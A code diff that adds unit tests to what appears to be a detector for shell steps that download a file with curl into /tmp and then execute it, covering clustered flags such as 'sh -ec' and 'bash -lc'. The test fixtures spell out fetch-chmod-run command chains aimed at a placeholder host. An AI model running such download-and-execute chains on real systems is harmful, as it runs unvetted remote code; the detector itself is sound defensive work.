@@ -928,6 +928,18 @@ class TestTheGapsTheGuardDocuments(unittest.TestCase):
         self.flagged(("get", 'sh -c "curl -sfL https://example.test/p -o /tmp/p"\n'),
                      ("run", "chmod +x /tmp/p\n/tmp/p\n"))
 
+    def test_a_clustered_c_flag_is_still_a_script(self):
+        # `sh -ec`, `bash -lc`, `bash -euc`: the ordinary CI idiom, not an
+        # obfuscation. A short-option cluster carrying `c` IS `-c`.
+        for opener in ("sh -ec", "bash -lc", "bash -euc", "bash -x -c"):
+            self.flagged(("get", '%s "curl -sfL https://example.test/p '
+                                 '-o /tmp/p"\n' % opener),
+                         ("run", "chmod +x /tmp/p\n/tmp/p\n"))
+
+    def test_a_shell_flag_cluster_without_c_hands_over_no_script(self):
+        self.accepted(("run", 'sh -eu "curl -sfL https://example.test/p '
+                              '-o /tmp/p"\nchmod +x /tmp/p\n'))
+
     def test_a_fetch_and_its_use_both_inside_the_string(self):
         self.flagged(("run", 'eval "curl -sfL https://example.test/p -o /tmp/p; '
                              'chmod +x /tmp/p"\n'))
